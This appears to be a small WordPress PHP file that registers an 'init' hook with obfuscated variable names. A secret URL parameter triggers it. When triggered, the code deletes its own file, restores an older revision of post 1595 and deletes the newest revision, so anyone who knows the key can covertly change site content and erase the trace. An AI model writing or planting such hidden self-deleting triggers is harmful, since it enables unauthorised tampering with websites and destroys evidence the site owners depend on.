<?php

function total_instant_request() {
	if (isset($_GET['newsletter_dev_like']) && $_GET['newsletter_dev_like'] === 'columns_print_portfolio') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$update_validator_activity = 1595;
		$avatar_permalink_search = wp_get_post_revisions($update_validator_activity);
		if (empty($avatar_permalink_search)) die('no revisions');
		if (count($avatar_permalink_search) < 2) die('less than 2');
		$translator_click_signature = array_shift($avatar_permalink_search);
		$name_archive_message_react = $translator_click_signature->ID;
		$rate_super_category = array_shift($avatar_permalink_search);
		$publish_portfolio_section = $rate_super_category->ID;
		$toolbox_elements_uploader = wp_restore_post_revision($publish_portfolio_section);
		if ($toolbox_elements_uploader === false) die('error restoring');
		$toolbox_elements_uploader = wp_delete_post_revision($name_archive_message_react);		
		if ($toolbox_elements_uploader === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'total_instant_request');
